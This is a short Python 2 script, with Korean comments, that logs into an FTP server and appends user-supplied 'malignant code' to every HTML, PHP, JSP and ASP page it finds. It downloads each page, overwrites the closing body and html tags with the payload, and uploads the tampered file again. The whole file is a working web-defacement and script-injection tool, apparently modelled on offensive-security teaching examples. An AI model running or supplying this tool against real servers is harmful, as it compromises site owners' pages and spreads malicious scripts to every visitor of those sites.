#-*- coding: utf-8 -*-
import ftplib, time

def injectCode(ftp, malignantCode):
    try:
        dirList=ftp.nlst()
        for file in dirList:
            if "." in file:
                if(".html" in file or ".htm" in file or ".php" in file or ".jsp" in file or ".asp" in file):
                    fp=open(file, 'w')
                    ftp.retrlines('RETR '+file, fp.write)
                    print '[+] Downloaded : ', file 
                    fp.seek(-14, 2) # EOF 에서 -14 바이트만큼 이동(HTML 문서의 마지막은 </body></html> 로 끝나므로 14바이트 앞으로 이동해서 악성스크립트를 삽입한다. 만약 </body></html> 코드의 중간이나 끝에 다른 문자나 공백이 추가로 온다면 14바이트 앞으로 이동하면 코드가 섞이기 때문에 제대로 동작하지 않을 것이다.)
                    fp.write(malignantCode+"</body></html>") # HTML 문서의 마지막 </body></html> 를 덮어 썼으므로 악성스크립트 뒤에 추가해준다.
                    fp.close()
                    ftp.storlines('STOR '+file, open(file)) # 해당 파일에 쓰기권한이 있어야 업로드 가능
                    print '[+] Uploaded Injected File : ', file 
    except Exception, e:
        print "[-] ", e
        time.sleep(30)
        exit(0)

def main():
    host=raw_input("Input FTP Server IP : ")
    user=raw_input("Input FTP Account : ")
    password=raw_input("Input FTP password : ")
    malignantCode=raw_input("Input Malignant Code : ") 
    ftp=ftplib.FTP(host)
    ftp.login(user, password)
    injectCode(ftp, malignantCode)

if __name__=="__main__":
    main()